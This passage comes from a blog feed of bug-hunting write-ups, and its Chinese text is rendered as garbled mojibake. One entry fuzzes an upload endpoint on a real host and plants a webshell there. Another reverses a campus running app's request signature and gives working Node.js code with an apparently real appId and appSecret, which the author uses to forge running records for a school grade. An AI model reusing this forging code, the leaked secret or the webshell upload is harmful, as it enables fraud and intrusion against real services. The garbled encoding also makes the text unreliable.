href="http://0.0.0.36/">http://36</a>.x.x.x&#x2F;upload_image.php<br><a href="https://img2020.cnblogs.com/blog/1771833/202112/1771833-20211221212519726-640468616.png"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192139184.png" alt="img"></a></p><p>å¯¹äºè¿™ç§é¡µé¢ï¼Œæ¯«æ— ç–‘é—®ï¼Œè¦å¯¹å‚æ•°è¿›è¡ŒFUZZ</p><h2 id="0x03-FUZZå‚æ•°-è¡¨å•ä¸Šä¼ "><a href="#0x03-FUZZå‚æ•°-è¡¨å•ä¸Šä¼ " class="headerlink" title="0x03 FUZZå‚æ•°+è¡¨å•ä¸Šä¼ "></a>0x03 FUZZå‚æ•°+è¡¨å•ä¸Šä¼ </h2><p>ä½¿ç”¨arjunå·¥å…·å¯¹å…¶å‚æ•°è¿›è¡Œfuzzï¼Œå‘ç°äº†ä¸€ä¸ªå‚æ•°å­—æ®µä¸ºdo</p><p>éšååœ¨burpsuiteä¸­å¯¹doçš„å‚æ•°å€¼è¿›è¡Œfuzz<br><a href="https://img2020.cnblogs.com/blog/1771833/202112/1771833-20211221212707411-781011341.png"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192139305.png" alt="img"></a></p><p>æˆåŠŸfuzzå‡ºä¸€ä¸ªdoçš„å‚æ•°å€¼ï¼Œupload<br><a href="https://img2020.cnblogs.com/blog/1771833/202112/1771833-20211221212735232-190611207.png"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192139410.png" alt="img"></a></p><p>æ„é€ url<br><a href="http://36.x.x.x/upload_image.php?do=upload%EF%BC%8C%E6%88%90%E5%8A%9F%E5%87%BA%E7%8E%B0%E4%B8%8A%E4%BC%A0%E8%A1%A8%E5%8D%95">http://36.x.x.x/upload_image.php?do=uploadï¼ŒæˆåŠŸå‡ºç°ä¸Šä¼ è¡¨å•</a><br><a href="https://img2020.cnblogs.com/blog/1771833/202112/1771833-20211221212755371-1273545490.png"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192139544.png" alt="img"></a></p><p>webshellåskr_anti.php</p><p>é€‰æ‹©æˆ‘ä»¬çš„webshellç›´æ¥ä¸Šä¼ </p><p>ä¸Šä¼ åfuzzä¸Šä¼ è·¯å¾„</p><pre><code class="perl">http://36.*.*.*/upload  --------&gt;  403ç»§ç»­fuzzhttp://36.*.*.*/upload/images  --------&gt;  403æ„é€ urlhttp://36.*.*.*/upload/images/skr_anti.php</code></pre><p><a href="https://img2020.cnblogs.com/blog/1771833/202112/1771833-20211221212902701-2023108540.png"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192139700.png" alt="img"></a></p><p>å–œæä¸€ä¸ªä¸¥é‡</p><h2 id="0x04-æ€»ç»“"><a href="#0x04-æ€»ç»“" class="headerlink" title="0x04 æ€»ç»“"></a>0x04 æ€»ç»“</h2><p>æˆ‘è¯´è¿™ä¸ªæ¼æ´æœ‰æ‰‹å°±è¡Œï¼Œå¤§å®¶åº”è¯¥æ²¡æ„è§å§</p><p>ç»¼åˆæ¥è¯´å­¦ä¹ æ€è·¯ç‚¹å¦‚ä¸‹ï¼š</p><p>1.é‡åˆ°ç©ºç™½æ•æ„Ÿé¡µé¢&#x2F;apiï¼ŒFUZZå‚æ•°å’Œå‚æ•°å€¼</p><p>2.ä¸Šä¼ æ²¡è¿”å›è·¯å¾„ä¸è¦æ…Œï¼ŒåŠªåŠ›å»FUZZ</p><p>3.SRCæµ‹è¯•çš„æ—¶å€™ä¸è¦ä¸Šä¼ webshellï¼Œä¼ phpinfoç­‰éªŒè¯codeå°±è¡Œï¼Œä¸ç„¶ä¼šè¢«é™èµé‡‘ï¼Œæˆ‘å°±æ˜¯åƒäº†å“‘å·´äºã€‚ã€‚</p><p>4.èµ„äº§æ”¶é›†æ˜¯çº¢é˜Ÿè¿˜æœ‰æ¸—é€æµ‹è¯•çš„æ ¸å¿ƒ</p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´æŒ–æ˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¼æ´æŒ–æ˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é‡ç”Ÿä¹‹æˆ‘æ˜¯èµé‡‘çŒäºº(äºŒ)-é€†å‘appç ´è§£æ•°æ®åŒ…signå€¼å®ç°ä»»æ„æ•°æ®é‡æ”¾æ·»åŠ </title>
      <link href="/2021/10/30/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA-%E4%BA%8C-%E9%80%86%E5%90%91app%E7%A0%B4%E8%A7%A3%E6%95%B0%E6%8D%AE%E5%8C%85sign%E5%80%BC%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E6%95%B0%E6%8D%AE%E9%87%8D%E6%94%BE%E6%B7%BB%E5%8A%A0/"/>
      <url>/2021/10/30/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA-%E4%BA%8C-%E9%80%86%E5%90%91app%E7%A0%B4%E8%A7%A3%E6%95%B0%E6%8D%AE%E5%8C%85sign%E5%80%BC%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E6%95%B0%E6%8D%AE%E9%87%8D%E6%94%BE%E6%B7%BB%E5%8A%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00å‰è¨€"><a href="#0x00å‰è¨€" class="headerlink" title="0x00å‰è¨€"></a>0x00å‰è¨€</h2><p>æœ¬æ–‡é¦–å‘å¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒºï¼Œä½œè€…J0o1eyï¼Œå¤§å®¶å¯ä»¥å¤šå¤šæ”¯æŒå¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒºå“¦ï¼ŒæŠ€æœ¯æ°›å›´æµ“åšï¼Œä½œè€…å¾…é‡ä¼˜åš~</p><p>æœ¬æœŸç™»åœºçš„ç›®æ ‡è™½ä¸æ˜¯SRCï¼Œä½†æ˜¯æ•´ä¸ªæ¼æ´çš„åˆ©ç”¨æ‰‹æ³•å¾ˆæœ‰å­¦ä¹ æ„ä¹‰ã€‚<strong>ç›®å‰åœ¨å¾ˆå¤šå¤§å‚çš„httpæ•°æ®åŒ…ä¸­éƒ½ä¼šæ·»åŠ signå€¼å¯¹æ•°æ®åŒ…æ˜¯å¦è¢«ç¯¡æ”¹è¿›è¡Œæ ¡éªŒï¼Œè€Œsignç®—æ³•çš„ç ´è§£å¾€å¾€æ˜¯æˆ‘ä»¬æ¼æ´æµ‹è¯•çš„å…³é”®æ‰€åœ¨~</strong></p><p>æœ¬äººåœ¨ä¸€äº›æ¼æ´æŒ–æ˜å®æˆ˜ä¸­<strong>ç»å¸¸å‘ç°åœ¨ç ´è§£signå€¼åï¼Œåœ¨æµ‹è¯•å„ç±»è¶Šæƒï¼Œé‡æ”¾ç­‰æ¼æ´æ—¶ä¸€é©¬å¹³å·</strong></p><p>ä»Šå¤©ç‰¹æ­¤ä¸ºå¤§å®¶å¸¦æ¥è¿™æ ·ä¸€ä¸ªç²¾å½©çš„å®æˆ˜æ¡ˆä¾‹ã€‚</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134573.jpg"></p><h2 id="0x01-èƒŒæ™¯"><a href="#0x01-èƒŒæ™¯" class="headerlink" title="0x01 èƒŒæ™¯"></a>0x01 èƒŒæ™¯</h2><p>å­¦æ ¡æ¯å­¦æœŸçš„ä½“è‚²æˆç»©ä¸­ä¼šæœ‰10ï¼…æ¥æºäºæŸè·‘æ­¥APPçš„æ‰“å¡æ•°æ®ï¼Œæœ¬äººä½œä¸ºä¸€ä¸ª<strong>ä½“æµ‹åªèƒ½å‹‰å¼ºåŠæ ¼</strong>çš„åºŸç‰©ï¼Œè‡ªç„¶å¾—æƒ³åŠæ³•æ‹¿åˆ°è¿™10åˆ†ï¼Œä»¥é˜²æŒ‚ç§‘</p><p>æ— å¥ˆè¿™ä¸ªappåå°è®¾ç½®çš„æ˜¯æ¯å­¦æœŸç”·ç”Ÿæ€»å…±è¦æ±‚è·‘120å…¬é‡Œæ‰èƒ½å®Œæ•´åœ°æ‹¿åˆ°10åˆ†ï¼Œéå¸¸æ¶å¿ƒã€‚</p><p>ä¸€å­¦æœŸè·‘120å…¬é‡Œï¼Œä½ è¿˜ä¸å¦‚é²¨äº†æˆ‘ï¼Œäºæ˜¯ä¾¿æœ‰äº†æ­¤æ–‡å¯¹äºå…¶appçš„crack</p><h2 id="0x02-åˆæ­¥æµ‹è¯•"><a href="#0x02-åˆæ­¥æµ‹è¯•" class="headerlink" title="0x02 åˆæ­¥æµ‹è¯•"></a>0x02 åˆæ­¥æµ‹è¯•</h2><p>æ‰‹æœºè£…å¥½httpsè¯ä¹¦ï¼ŒæŒ‚å¥½Burpsuiteçš„ä»£ç†ï¼Œéšåæˆ‘ä»¬ç›´æ¥å»æŠ“å–è¯¥APPä¸Šä¼ æ ¡å›­è·‘æ­¥æ•°æ®æ—¶çš„è¯·æ±‚<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134858.png" alt="è·‘æ­¥æ•°æ®ä¸Šä¼ è§£å¯†"></p><p>è¯·æ±‚å¦‚ä¸‹</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134145.png" alt="è·‘æ­¥æ•°æ®è¯·æ±‚"></p><p>æˆ‘ä»¬å‘ç°å•æ¬¡è·‘æ­¥è·ç¦»å¯¹åº”çš„POSTå‚æ•°ä¸ºFormatSportRangeï¼Œè‡ªç„¶äºŒè¯ä¸è¯´å¯¹å…¶è¿›è¡Œä¿®æ”¹ï¼Œå°†0.000ä¿®æ”¹ä¸º5.000</p><p>æ­¤æ—¶æ‚²å‰§å‘ç”Ÿäº†ï¼Œç›´æ¥æç¤ºè®¤è¯å¤±è´¥~</p><p>å®šç¥ç»†çœ‹ï¼Œå‘ç°POSTæ•°æ®æœ«å°¾æœ‰signç­¾åâ€¦.</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134373.png" alt="æŠ¥æ–‡æœ«å°¾signç­¾å"></p><p>æ­¤æ—¶è€å¼€å‘æˆ–è€å®‰å…¨è‚¯å®šå°±çŸ¥é“å‘ç”Ÿç”šä¹ˆäº‹äº†ï¼Œä¸ºäº†è®©æœ¬æ–‡å¯¹æ–°æ‰‹å‹å¥½ä¸€äº›ï¼Œä¸‹é¢ç®€å•è®²ä¸€ä¸‹signæ ¡éªŒæ‰‹æ³•</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134482.jpg"></p><h2 id="0x03-ä½•ä¸ºSignç­¾åæ ¡éªŒï¼Ÿ"><a href="#0x03-ä½•ä¸ºSignç­¾åæ ¡éªŒï¼Ÿ" class="headerlink" title="0x03 ä½•ä¸ºSignç­¾åæ ¡éªŒï¼Ÿ"></a>0x03 ä½•ä¸ºSignç­¾åæ ¡éªŒï¼Ÿ</h2><p><strong>Signç­¾åæ ¡éªŒæ³•æœ¬è´¨ä¸Šæ˜¯å¯¹å®¢æˆ·ç«¯ä¼ è¾“æ•°æ®åˆæ³•æ€§çš„ä¸€ç§æ ¡éªŒæ‰‹æ®µ</strong></p><p><strong>å…¶å¸¸ç”¨æ‰‹æ³•ä¸ºï¼Œåœ¨ç”¨æˆ·å®¢æˆ·ç«¯ä¼ è¾“çš„æ•°æ®ä¸­é¢å¤–åŠ ä¸Šæ—¶é—´æˆ³ä»¥åŠç‰¹æ®Šå­—ç¬¦ï¼Œéšåä¸€èµ·å¾—å‡ºæ•´ä½“æ•°æ®çš„åŠ å¯†å€¼(å¸¸ç”¨MD5,SHA1ç­‰åŠ å¯†ç®—æ³•)</strong></p><p><strong>è¿™å°±å¯¼è‡´äº†ç”¨æˆ·åœ¨ä¸çŸ¥æ™“ç¨‹åºçš„åŸå§‹æ•°æ®ç”Ÿæˆsignå€¼çš„æ–¹æ³•æƒ…å†µä¸‹ï¼Œè‹¥å¯¹ä¼ è¾“åˆ°æœåŠ¡ç«¯çš„æ•°æ®è¿›è¡Œç¯¡æ”¹ï¼Œåœ¨åç«¯éƒ½ä¼šé‰´æƒå¤±è´¥ï¼Œå¯¼è‡´ç”¨æˆ·ç¯¡æ”¹åçš„æ•°æ®æ— æ•ˆã€‚</strong></p><h2 id="0x04-signå€¼çš„å®‰å…¨å¯¹æŠ—æ–¹æ³•"><a href="#0x04-signå€¼çš„å®‰å…¨å¯¹æŠ—æ–¹æ³•" class="headerlink" title="0x04 signå€¼çš„å®‰å…¨å¯¹æŠ—æ–¹æ³•"></a>0x04 signå€¼çš„å®‰å…¨å¯¹æŠ—æ–¹æ³•</h2><p>é’ˆå¯¹æœ‰signç­¾åå€¼çš„æ•°æ®åŒ…ï¼Œæœ¬äººå¸¸ç”¨çš„æµ‹è¯•æ‰‹æ³•æœ‰ä¸¤ä¸ªï¼š</p><p><strong>1.æ£€æµ‹signå€¼æ˜¯å¦ä¸ºå¼±å‡­æ®</strong></p><p><strong>2.æ£€æµ‹signå€¼æ˜¯å¦å¯ä»¥ç½®ç©º</strong></p><p><strong>ç¬¬ä¸€ç§ç±»å‹é€šå¸¸æœ‰ä¸¤ç§æƒ…å†µ</strong></p><p><strong>â‘ çœ‹signå€¼æ˜¯å¦é‡‡ç”¨äº†ä¸€äº›å¼±åŠ å¯†&#x2F;ç¼–ç æ–¹æ³•(ä¾‹å¦‚base64)ï¼Œæˆ‘ä»¬è§£ç åå¯ä»¥ç›´æ¥çœ‹åˆ°signçš„åŸå§‹æ•°æ®ã€‚</strong></p><p><strong>â‘¡æµ‹è¯•signå€¼æ˜¯å¦ä¸ºæ—¶é—´æˆ³&#x2F;éšæœºæ•°åŠ å¯†åçš„å¯†æ–‡å€¼ï¼Œåœ¨ä¸€äº›å®æˆ˜æƒ…å†µä¸­ï¼Œå¾ˆå¤šå‚å•†å®‰å…¨å¼€å‘æ„è¯†ä¸è¶³ï¼Œä¼šå°†signå€¼çš„ç®—æ³•ç›´æ¥æš´éœ²åœ¨å‰ç«¯æœªåŠ å¯†çš„jsä¸­ï¼Œæˆ–è€…ç›´æ¥å°†ç”¨æˆ·è¿›è¡ŒæŸæ“ä½œçš„æ—¶é—´æˆ³è¿›è¡Œmd5åŠ å¯†åä½œä¸ºsignå‡­æ®ï¼Œå¯¼è‡´signå‡­æ®åœ¨ä¸€æ®µæ—¶é—´å†…å¯ä»¥é€šè¿‡éå†æ—¶é—´æˆ³è¿›è¡ŒçŒœè§£</strong></p><p><strong>ç¬¬äºŒç§ç±»å‹å°±æ¯”è¾ƒå¥½ç†è§£ï¼Œæˆ‘ä»¬ç›´æ¥å°†signå‚æ•°ä»¥åŠå€¼åˆ æ‰ï¼Œçœ‹åç«¯ç¨‹åºæ˜¯å¦å¯ä»¥ä¸æ ¡éªŒsignç›´æ¥æ‰§è¡Œæˆ‘ä»¬ä¼ è¾“çš„æ•°æ®</strong></p><p>ä¸Šè¿°æ¦‚å¿µå¯èƒ½çœ‹èµ·æ¥æ¯”è¾ƒæŠ½è±¡ï¼Œä¸‹é¢æˆ‘ä»¬ç»§ç»­æ¥çœ‹æœ¬æ¡ˆä¾‹</p><h2 id="0x05-äºŒæ¬¡æµ‹è¯•"><a href="#0x05-äºŒæ¬¡æµ‹è¯•" class="headerlink" title="0x05 äºŒæ¬¡æµ‹è¯•"></a>0x05 äºŒæ¬¡æµ‹è¯•</h2><p>æˆ‘ä»¬å…ˆå°è¯•ç¬¬ä¸€ç§æ–¹æ³•ï¼Œä¸Šæ–¹æ·»åŠ è·‘æ­¥è®°å½•è·å–åˆ°çš„signå€¼ä¸º<strong>5ded7f11f080fb5a9d403c9d0963ebaa</strong></p><p>æ‹¿çœ¼ä¸€çœ‹ï¼Œå¤§æ¦‚ç‡signå€¼æ˜¯ä½¿ç”¨md5åŠ å¯†çš„ï¼Œæˆ‘ä»¬éšåå¯¹å…¶è¿›è¡Œè§£å¯†</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134572.png" alt="md5è§£å¯†sign"></p><p>GGäº†ï¼Œçœ‹æ ·å‚å•†çš„å®‰å…¨æ„è¯†ä¸ç®—å¤ªå·®~æ²¡æœ‰ä½¿ç”¨æ—¶é—´æˆ³æˆ–è€…éšæœºæ•°åŠ å¯†åçš„å€¼ä½œä¸ºsignï¼Œå¯¼è‡´signå¯ä»¥è¢«æ— è„‘éå†çŒœè§£</p><p>éšåæˆ‘ä»¬å°è¯•ç¬¬äºŒç§æ–¹æ³•ï¼Œç½®ç©ºsignå€¼</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134750.png" alt="ç½®ç©ºsign"></p><p>å‘ç°ä¾ç„¶é‰´æƒè®¤è¯å¤±è´¥ï¼Œggäº†ã€‚</p><p>çœ‹æ ·ä¸¤ç§å¸¸è§„çš„å¯¹æŠ—signçš„æ–¹æ³•å·²ç»åºŸäº†ï¼Œæˆ‘ä»¬åªèƒ½ä»appä¸‹æ‰‹äº†ï¼Œé€†å‘å°è¯•å»å¯»æ‰¾å…¶signçš„ç®—æ³•</p><h2 id="0x06-é€†å‘apkæ–‡ä»¶å–å¾—å…¶signå€¼ç®—æ³•"><a href="#0x06-é€†å‘apkæ–‡ä»¶å–å¾—å…¶signå€¼ç®—æ³•" class="headerlink" title="0x06 é€†å‘apkæ–‡ä»¶å–å¾—å…¶signå€¼ç®—æ³•"></a>0x06 é€†å‘apkæ–‡ä»¶å–å¾—å…¶signå€¼ç®—æ³•</h2><p>æ‹¿åˆ°ç¨‹åºapkç›´æ¥æŸ¥å£³ï¼Œè¿æ°”ä¸é”™ï¼Œapkæ²¡åŠ å£³ï¼Œçœäº†ä¸å°‘åŠŸå¤«</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134862.png" alt="æŸ¥å£³"></p><p>ç›´æ¥å°†apkæ–‡ä»¶æ‹–åˆ°jadxä¸­ï¼Œå¯¹å…¶è¿›è¡Œé€†å‘åˆ†æ</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134098.png" alt="jadxé€†å‘"></p><p>å…¨å±€æœç´ signï¼Œåœ¨ä»”ç»†æŒ¨ä¸ªæŸ¥çœ‹åï¼ŒæˆåŠŸå®šä½åˆ°äº†å…¶signç”Ÿæˆçš„å…³é”®ç®—æ³•</p><p>ä»£ç è¿‡é•¿ï¼Œå…³é”®éƒ¨åˆ†ä»£ç å¦‚ä¸‹</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134337.png" alt="signç®—æ³•â‘ "></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134437.png" alt="signç®—æ³•â‘¡"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œå…¶signå€¼çš„ç­¾åç®—æ³•ä¸º</p><p>åˆ›å»ºä¸€ä¸ªé“¾è¡¨, å°†å…¨éƒ¨å·²æœ‰çš„å‚æ•°åŠ å…¥è¿›å», ç„¶åå†åŠ ä¸Šä¸€äº›é”®å€¼å¯¹(å…¶ä¸­timestampæ—¶é—´æˆ³æˆ‘ä»¬å·²çŸ¥ï¼ŒappIDï¼ŒappSecretä¸¤ä¸ªé”®å€¼å¯¹æˆ‘ä»¬å‡æœªçŸ¥)</p><p>ä¹‹åå†å°†å…¨éƒ¨çš„é”®å€¼å¯¹æ ¹æ®é”®çš„å­—æ¯é¡ºåºè¿›è¡Œæ’åº, ä¹‹åä½¿ç”¨ <code>querystring</code> æ–¹å¼å¯¹é”®å€¼å¯¹è¿›è¡Œç¼–ç .</p><p>æœ€åå†å¯¹ç¼–ç åçš„å­—ç¬¦ä¸²æ±‚ <code>MD5</code> å€¼, å°±æ˜¯æœ€ç»ˆçš„ç­¾åäº†, éº»çƒ¦çš„ä¸€æ¯”</p><h2 id="0x07-ç»§ç»­é€†å‘apkæ–‡ä»¶è·å–æœªçŸ¥é”®å€¼å¯¹"><a href="#0x07-ç»§ç»­é€†å‘apkæ–‡ä»¶è·å–æœªçŸ¥é”®å€¼å¯¹" class="headerlink" title="0x07 ç»§ç»­é€†å‘apkæ–‡ä»¶è·å–æœªçŸ¥é”®å€¼å¯¹"></a>0x07 ç»§ç»­é€†å‘apkæ–‡ä»¶è·å–æœªçŸ¥é”®å€¼å¯¹</h2><p>æˆ‘ä»¬ç»§ç»­æ¥æ‰¾appIDï¼ŒappSecretä¸¤ä¸ªæˆ‘ä»¬æœªçŸ¥çš„é”®å€¼å¯¹</p><p>å‘ç°å…¶è·å–æ–¹æ³•å¦‚ä¸‹</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134569.png" alt="è·å–æœªçŸ¥é”®å€¼å¯¹"></p><p><strong>â‘ appIDé”®å€¼å¯¹çš„è·å–æ–¹æ³•:</strong></p><p>å¦‚æœè¯·æ±‚çš„urlæ˜¯ <a href="https://m.xxxxx.com/">https://m.xxxxx.com</a> åˆ™ä¸ºmoveï¼Œå¦åˆ™è°ƒç”¨getAppIdæ–¹æ³•</p><p>åé¢æˆ‘æœç´¢äº†ä¸€ä¸‹getAppIdæ–¹æ³•ï¼Œå‘ç°å…¶æœ¬è´¨ä¸Šæ˜¯è·å–æŸæ¥å£openIdçš„å‚æ•°å€¼ï¼Œéšåèµ‹å€¼ç»™AppID</p><p>æˆ‘å»burpsuiteèµ°äº†ä¸€éè¿™ä¸ªapkçš„ä¸šåŠ¡ï¼Œç„¶åå»http historyæœç´¢äº†ä¸€ä¸‹openId,ç›´æ¥è·å–åˆ°äº†æˆ‘ä»¬å­¦æ ¡çš„openIdå‚æ•°å€¼ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è·å–åˆ°äº†AppID</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134671.png" alt="è·å–AppID"></p><p><strong>â‘¡appScereté”®å€¼å¯¹è·å–æ–¹æ³•</strong></p><p>åœ¨jadxä¸­æç¤ºappSecreé”®tå¯¹åº”çš„å€¼æ¥æºäºg.bï¼Œæˆ‘ä»¬åœ¨importçš„åŒ…ä¸­æˆåŠŸæ‰¾åˆ°äº†g.bï¼ˆå³appSecretï¼‰</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134802.png" alt="appSecret"></p><h2 id="0x08-Nodejsç¼–å†™è®¡ç®—signçš„Exploit"><a href="#0x08-Nodejsç¼–å†™è®¡ç®—signçš„Exploit" class="headerlink" title="0x08 Nodejsç¼–å†™è®¡ç®—signçš„Exploit"></a>0x08 Nodejsç¼–å†™è®¡ç®—signçš„Exploit</h2><p>signçš„ç®—æ³•å·²ç»æœ‰äº†ï¼ŒæœªçŸ¥çš„é”®å€¼å¯¹æˆ‘ä»¬ä¹Ÿæ‹¿åˆ°äº†ï¼Œä¸‹é¢å°±æ˜¯ç›´æ¥ç¼–å†™è®¡ç®—signçš„exploitçš„æ—¶åˆ»å•¦~</p><p>æˆ‘ä»¬é€‰æ‹©ç”¨nodejsæ¥è¿˜åŸæ•´ä¸ªsignçš„åŠ å¯†ç®—æ³•(æ³¨æ„ï¼Œæˆ‘ä»¬å°†formatSportRangeè·‘æ­¥è·ç¦»æ”¹ä¸ºäº†5.003)</p><pre><code class="javascript">var parseQueryString = function( url )&#123;    var reg_url =/^[^\?]+\?([\w\W]+)$/,        reg_para=/([^&amp;=]+)=([\w\W]*?)(&amp;|$)/g, //g is very important        arr_url = reg_url.exec( url ),        ret        = &#123;&#125;;    if( arr_url &amp;&amp; arr_url[1] )&#123;        var str_para = arr_url[1],result;        while((result = reg_para.exec(str_para)) != null)&#123;            ret[result[1]] = result[2];        &#125;    &#125;    return ret;&#125;var url =&quot;www.xxx.com/index.php?userId=34263&amp;runType=2&amp;startTime=1635573372448&amp;endTime=1635573425940&amp;gitudeLatitude=%5B%7B%22latitude%22%3A34.383468%2C%22locationType%22%3A4%2C%22longitude%22%3A108.976148%2C%22puase%22%3Afalse%2C%22speed%22%3A0.0%2C%22time%22%3A1635573372480%7D%2C%7B%22latitude%22%3A34.383484%2C%22locationType%22%3A4%2C%22longitude%22%3A108.976155%2C%22puase%22%3Atrue%2C%22speed%22%3A0.0%2C%22time%22%3A1635573373314%7D%2C%7B%22latitude%22%3A34.383489%2C%22locationType%22%3A2%2C%22longitude%22%3A108.976155%2C%22puase%22%3Atrue%2C%22speed%22%3A1.55%2C%22time%22%3A1635573378344%7D%2C%7B%22latitude%22%3A34.383408%2C%22locationType%22%3A2%2C%22longitude%22%3A108.976193%2C%22puase%22%3Atrue%2C%22speed%22%3A1.55%2C%22time%22%3A1635573398400%7D%2C%7B%22latitude%22%3A34.383479%2C%22locationType%22%3A2%2C%22longitude%22%3A108.976152%2C%22puase%22%3Atrue%2C%22speed%22%3A1.55%2C%22time%22%3A1635573418403%7D%5D&amp;identify=12cc1557-f226-4d19-a01f-58f492620818&amp;formatSportTime=00%3A00%3A01&amp;formatSportRange=5.003&amp;avgspeed=0.0&amp;speed=0%270%22&amp;okPointList=%5B%5D&amp;brand=Xiaomi&amp;model=Mi%2010&amp;system=Android&amp;version=10&amp;appVersion=1.5.73&amp;stepNumbers=%5B0%5D&amp;isFaceStatus=0&amp;points=%5B%5D&amp;uploadType=0&amp;timestamp=1635573451940&quot;;var obj = parseQueryString(url);//console.log(obj)   //querystringåºåˆ—åŒ–const crypto = require(&#39;crypto&#39;)const APP_ID = &quot;ec74df4f7ea14f1fb585bbc9f936fc23&quot;const data = objconsole.log(data)const timestamp = &#39;1635573451940&#39;function ff(data, timestamp, appId = APP_ID)&#123;  const d = &#123; ...data, appId, timestamp: &#39;1634356066432&#39;,appSecret: &#39;e8167ef026cbc5e456ab837d9d6d9254&#39; &#125;  const ans = crypto.createHash(&#39;md5&#39;).update(Object.keys(d).sort().map(k =&gt; k + &#39;=&#39; + d[k]).join(&#39;&amp;&#39;)).digest(&#39;hex&#39;)  console.log(&quot;sign is&quot;,ans)&#125;ff(data, timestamp, APP_ID)</code></pre><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134886.png" alt="è®¡ç®—sign"></p><p>å¤§åŠŸå‘Šæˆï¼Œæˆ‘ä»¬æˆåŠŸåºåˆ—åŒ–queryStringåè®¡ç®—å‡ºäº†signå€¼ï¼Œæˆ‘ä»¬ç°åœ¨å¯ä»¥ç¯¡æ”¹ä»»æ„æ•°æ®å¹¶æ ¹æ®ç®—æ³•ç”Ÿæˆä¼ªé€ çš„signå€¼</p><h2 id="0x09-æµ‹è¯•"><a href="#0x09-æµ‹è¯•" class="headerlink" title="0x09 æµ‹è¯•"></a>0x09 æµ‹è¯•</h2><p>æˆ‘ä»¬å°†åŸæ¥çš„formatSportRangeè·‘æ­¥è·ç¦»æ”¹ä¸ºäº†ä»0.000ä¿®æ”¹ä¸º5.003ï¼Œå¹¶ä½¿ç”¨ç¨‹åºç”Ÿæˆçš„signå€¼</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134045.png" alt="image-20211030160329056"></p><p>å¦‚å›¾ï¼Œå¤§åŠŸå‘Šæˆï¼Œè·‘æ­¥è®°å½•ä¿å­˜æˆåŠŸï¼Œæˆ‘ä»¬æˆåŠŸä½¿ç”¨ä¼ªé€ çš„signç­¾åå¢åŠ äº†ä¸€æ¡5.003 kmçš„è·‘æ­¥è®°å½•</p><p>è¿”å›appæŸ¥çœ‹~</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134137.png"></p><p>niceï¼</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134311.png"></p><h2 id="0x10-åè¨€"><a href="#0x10-åè¨€" class="headerlink" title="0x10 åè¨€"></a>0x10 åè¨€</h2><p>é‡åˆ°å¯èƒ½çš„æ¼æ´ç‚¹è«è¦è½»è¨€æ”¾å¼ƒï¼Œå†åšæŒä¸€ä¸‹ï¼Œæ›™å…‰å°±åœ¨å‰æ–¹~</p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134984.gif" style="zoom:80%;" />]]></content>
      
      
      <categories>
          
          <category> æ¼æ´æŒ–æ˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¼æ´æŒ–æ˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é‡ç”Ÿä¹‹æˆ‘æ˜¯èµé‡‘çŒäºº(ä¸€)-è½»æ¾getæŸsrc soapæ³¨å…¥</title>
      <link href="/2021/08/19/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA-%E4%B8%80-%E8%BD%BB%E6%9D%BEget%E6%9F%90src-soap%E6%B3%A8%E5%85%A5/"/>
      <url>/2021/08/19/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA-%E4%B8%80-%E8%BD%BB%E6%9D%BEget%E6%9F%90src-soap%E6%B3%A8%E5%85%A5/</url>
      
